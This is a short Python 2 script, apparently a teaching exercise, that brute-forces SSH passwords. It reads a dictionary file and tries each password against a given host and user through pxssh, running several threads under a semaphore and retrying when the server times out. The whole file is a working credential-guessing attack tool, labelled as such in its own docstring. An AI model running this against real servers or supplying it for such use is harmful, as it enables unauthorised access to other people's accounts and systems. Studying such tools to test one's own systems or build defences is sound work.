import pxssh #To make the SSH connection
import optparse #To parse the flags
import time #To Sleep the threads
from threading import * #To make the threads and the semaphore

maxConnections = 5 # The number of max connections at time
maxFails = 5 # The number of max fails
connection_lock = BoundedSemaphore(value=maxConnections) #The Semaphore to control the max connections
Found = False #To control if we found the pass
Fails = 0 #To control if we have more than "MaxFails" and finish

def connect(host, user, password, release):
	"""
	Function that tries the SSH connection.
	"""
	global Found #Take the global var
	global Fails # "    "     "    "

	#Try to make the SSH connection, if no Exception that means that the password is right, so print it and finish
	try:
		socket = pxssh.pxssh()
		socket.login(host, user, password)
		print "[+] Password Found: %s" % password
		Found = True

	except Exception, e:
		#If "read_nonblocking" is in the Exception's description means that the server is busy. Increase the Fails counter, sleep 5 seconds and try it again.
		if "read_nonblocking" in str(e):
			Fails += 1
			time.sleep(5)
			connect(host, user, password, False)
		#If "synchronize with original prompt" is in the Exception's description means that pxssh have dificult to get the prompt, sleep 1 second and try again
		elif "synchronize with original prompt" in str(e):
			time.sleep(1)
			connect(host, user, password, False)

	finally:
		#Executes every time, and free the semaphore if that's the "main" thread (not the other ones that are created with the Exceptions)
		if release:
			connection_lock.release() # Free the Semaphore

def main():
	"""
	SSH Password Cracker with a dictionary.
	"""
	#Take the flags options.
	parser = optparse.OptionParser("usage %prog -H <target host> -u <user> -f <password list>")
	parser.add_option("-H", dest="hostTarget", type="string", help="Specify target host")
	parser.add_option("-u", dest="user", type="string", help="Specify the user")
	parser.add_option("-f", dest="passwordFile", type="string", help="Specify passwords file (one for row)")

	(options, args) = parser.parse_args()
	host = options.hostTarget
	user = options.user
	passwordFile = options.passwordFile

	if host == None or user == None or passwordFile == None:
		print parser.usage
		exit(1)

	pwdFile = open(passwordFile, "r") #Open the file with read perms
	for line in pwdFile.readlines(): #Read the lines (one password for line)
		#Check the flobal vars Found and Fails to stop the program if it's needed
		if Found:
			print "[*] Exiting: Password Found"
			exit(0)
		if Fails > maxFails:
			print "[!] Exiting: Too Many Socket Timeouts"
			exit(1)

		connection_lock.acquire() #Get the turn with the Semaphore
		password = line.strip("\r").strip("\n") #Remove \r and \n of the line
		print "[-] Testing: %s" %(password)
		t = Thread(target=connect, args=(host, user, password, True)) #Create the Thread object
		child = t.start() #And runs it!!! =D


if __name__ == "__main__":
	main()
